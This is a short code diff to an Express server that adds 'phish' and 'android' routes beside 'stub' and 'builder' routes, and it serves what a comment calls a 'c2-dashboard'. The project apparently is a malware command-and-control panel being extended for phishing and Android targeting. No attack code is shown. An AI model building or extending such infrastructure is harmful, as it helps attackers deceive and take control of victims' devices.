@@ -84,6 +84,8 @@ app.use(require("./routes/auth"));
 app.use(require("./routes/stub"));
 app.use(require("./routes/admin"));
 app.use(require("./routes/builder"));
+app.use(require("./routes/phish"));
+app.use(require("./routes/android"));
 
 // ── Dashboard static files ────────────────────────────────────────────────────
 // Serves c2-dashboard/ at the root so login.html and index.html are reachable
